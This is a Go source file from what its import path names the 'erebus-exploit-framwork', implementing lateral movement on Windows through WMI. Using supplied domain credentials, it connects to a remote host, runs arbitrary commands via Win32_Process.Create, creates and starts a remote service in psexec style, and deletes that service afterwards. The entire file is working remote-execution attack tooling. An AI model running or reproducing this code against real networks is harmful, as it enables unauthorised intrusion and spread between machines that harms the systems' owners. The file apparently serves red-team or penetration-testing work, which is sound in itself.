//go:build windows

package lateral

import (
	"context"
	"fmt"
	"strings"

	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
)

func wmiConnect(ctx context.Context, cfg *pb.LateralMoveConfig) (*ole.IDispatch, func(), error) {
	if err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED); err != nil {
		return nil, nil, fmt.Errorf("CoInitializeEx: %w", err)
	}
	cleanup := func() { ole.CoUninitialize() }

	unknown, err := oleutil.CreateObject("WbemScripting.SWbemLocator")
	if err != nil {
		cleanup()
		return nil, nil, fmt.Errorf("CreateObject SWbemLocator: %w", err)
	}
	locator, err := unknown.QueryInterface(ole.IID_IDispatch)
	unknown.Release()
	if err != nil {
		cleanup()
		return nil, nil, err
	}

	path := fmt.Sprintf(`\\%s\root\cimv2`, cfg.Target)
	user := formatDomainUser(cfg.Domain, cfg.Username)
	pass := cfg.Password
	if cfg.NtlmHash != "" {
		return nil, nil, fmt.Errorf("wmi does not support ntlm_hash directly; use password or winrm/psexec")
	}

	select {
	case <-ctx.Done():
		locator.Release()
		cleanup()
		return nil, nil, ctx.Err()
	default:
	}

	serviceRaw, err := oleutil.CallMethod(locator, "ConnectServer", path, user, pass, "", cfg.Domain, "", 0)
	locator.Release()
	if err != nil {
		cleanup()
		return nil, nil, fmt.Errorf("ConnectServer: %w", err)
	}
	service := serviceRaw.ToIDispatch()
	release := func() {
		service.Release()
		cleanup()
	}
	return service, release, nil
}

func wmiRunCommand(ctx context.Context, cfg *pb.LateralMoveConfig) (string, error) {
	service, release, err := wmiConnect(ctx, cfg)
	if err != nil {
		return "", err
	}
	defer release()

	processClassRaw, err := oleutil.CallMethod(service, "Get", "Win32_Process")
	if err != nil {
		return "", fmt.Errorf("Get Win32_Process: %w", err)
	}
	processClass := processClassRaw.ToIDispatch()
	defer processClass.Release()

	result, err := oleutil.CallMethod(processClass, "Create", cfg.Command)
	if err != nil {
		return "", fmt.Errorf("Win32_Process.Create: %w", err)
	}
	defer result.Clear()

	out := result.ToIDispatch()
	defer out.Release()

	var sb strings.Builder
	if v, err := oleutil.GetProperty(out, "ReturnValue"); err == nil {
		sb.WriteString(fmt.Sprintf("ReturnValue=%v", v.Value()))
	}
	if v, err := oleutil.GetProperty(out, "ProcessId"); err == nil {
		if sb.Len() > 0 {
			sb.WriteString(", ")
		}
		sb.WriteString(fmt.Sprintf("ProcessId=%v", v.Value()))
	}
	return sb.String(), nil
}

func wmiCreateAndStartService(ctx context.Context, cfg *pb.LateralMoveConfig, name, path string) error {
	service, release, err := wmiConnect(ctx, cfg)
	if err != nil {
		return err
	}
	defer release()

	svcClassRaw, err := oleutil.CallMethod(service, "Get", "Win32_Service")
	if err != nil {
		return fmt.Errorf("Get Win32_Service: %w", err)
	}
	svcClass := svcClassRaw.ToIDispatch()
	defer svcClass.Release()

	createRaw, err := oleutil.CallMethod(svcClass, "Create", name, name, path, 16, 1, "Manual", false, "", "", "")
	if err != nil {
		return fmt.Errorf("Win32_Service.Create: %w", err)
	}
	defer createRaw.Clear()

	createDisp := createRaw.ToIDispatch()
	defer createDisp.Release()
	if v, err := oleutil.GetProperty(createDisp, "ReturnValue"); err == nil {
		if rv, ok := v.Value().(int32); ok && rv != 0 {
			return fmt.Errorf("Win32_Service.Create return code %d", rv)
		}
	}

	instanceRaw, err := oleutil.CallMethod(service, "Get", fmt.Sprintf("Win32_Service.Name='%s'", name))
	if err != nil {
		return fmt.Errorf("Get service instance: %w", err)
	}
	instance := instanceRaw.ToIDispatch()
	defer instance.Release()

	startRaw, err := oleutil.CallMethod(instance, "StartService")
	if err != nil {
		return fmt.Errorf("StartService: %w", err)
	}
	defer startRaw.Clear()
	return nil
}

func psexecStartService(ctx context.Context, cfg *pb.LateralMoveConfig, serviceName, remotePath string) error {
	return wmiCreateAndStartService(ctx, cfg, serviceName, remotePath)
}

func wmiDeleteService(ctx context.Context, cfg *pb.LateralMoveConfig, name string) error {
	service, release, err := wmiConnect(ctx, cfg)
	if err != nil {
		return err
	}
	defer release()

	instanceRaw, err := oleutil.CallMethod(service, "Get", fmt.Sprintf("Win32_Service.Name='%s'", name))
	if err != nil {
		return nil // already gone
	}
	instance := instanceRaw.ToIDispatch()
	defer instance.Release()

	stopRaw, err := oleutil.CallMethod(instance, "StopService")
	if err == nil {
		stopRaw.Clear()
	}

	deleteRaw, err := oleutil.CallMethod(instance, "Delete")
	if err != nil {
		return fmt.Errorf("Win32_Service.Delete: %w", err)
	}
	deleteRaw.Clear()
	return nil
}